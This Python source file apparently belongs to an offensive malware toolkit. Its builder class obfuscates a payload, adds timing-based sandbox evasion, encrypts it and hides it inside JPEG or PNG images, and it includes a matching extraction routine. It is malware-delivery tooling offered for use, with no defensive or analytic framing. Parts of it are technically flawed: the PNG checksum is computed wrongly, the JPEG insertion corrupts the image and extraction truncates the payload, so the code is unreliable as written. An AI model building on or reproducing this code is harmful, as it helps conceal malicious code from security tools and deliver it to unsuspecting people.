import os
import zlib
import random
import struct
from ..core.crypter import Crypter
from ..core.obfuscator import CodeObfuscator

class PolyglotBuilder:
    def __init__(self):
        self.crypter = Crypter()
        self.obfuscator = CodeObfuscator()
        
    def create_polyglot(self, payload_code, carrier_file):
        """Create a polyglot file that combines the payload with a carrier file"""
        # First obfuscate the payload
        obfuscated_code = self.obfuscator.obfuscate_code(payload_code)
        
        # Add sandbox evasion
        obfuscated_code = self.obfuscator.add_timing_evasion(obfuscated_code)
        
        # Encrypt the payload
        encrypted_payload = self.crypter.encrypt(obfuscated_code)
        
        # Read carrier file
        with open(carrier_file, 'rb') as f:
            carrier_data = f.read()
            
        # Create polyglot structure
        output = bytearray()
        
        if carrier_file.lower().endswith('.jpg') or carrier_file.lower().endswith('.jpeg'):
            output.extend(carrier_data[:2])  # JPEG header
            output.extend(b'PAYLOAD:' + encrypted_payload)
            output.extend(carrier_data[2:])
        elif carrier_file.lower().endswith('.png'):
            png_header = carrier_data[:8]
            first_chunk = carrier_data[8:8+struct.unpack('>I', carrier_data[8:12])[0]+12]
            output.extend(png_header)
            output.extend(first_chunk)
            
            # Insert our custom chunk
            chunk_data = encrypted_payload
            chunk_length = len(chunk_data)
            output.extend(struct.pack('>I', chunk_length))
            output.extend(b'pYld')  # Custom chunk type
            output.extend(chunk_data)
            crc = zlib.crc32(chunk_data)
            output.extend(struct.pack('>I', crc))
            
            # Add rest of PNG
            output.extend(carrier_data[8+len(first_chunk):])
        else:
            raise ValueError("Unsupported carrier file format")
            
        return bytes(output)
        
    def extract_payload(self, polyglot_data):
        """Extract and decrypt payload from polyglot file"""
        try:
            # Try JPEG format
            if b'PAYLOAD:' in polyglot_data:
                start = polyglot_data.index(b'PAYLOAD:') + 8
                encrypted_payload = polyglot_data[start:start+1000]  # Adjust size as needed
                return self.crypter.decrypt(encrypted_payload)
            
            # Try PNG format
            if b'pYld' in polyglot_data:
                start = polyglot_data.index(b'pYld') - 4
                length = struct.unpack('>I', polyglot_data[start:start+4])[0]
                encrypted_payload = polyglot_data[start+8:start+8+length]
                return self.crypter.decrypt(encrypted_payload)
                
        except Exception as e:
            print(f"Error extracting payload: {e}")
            return None
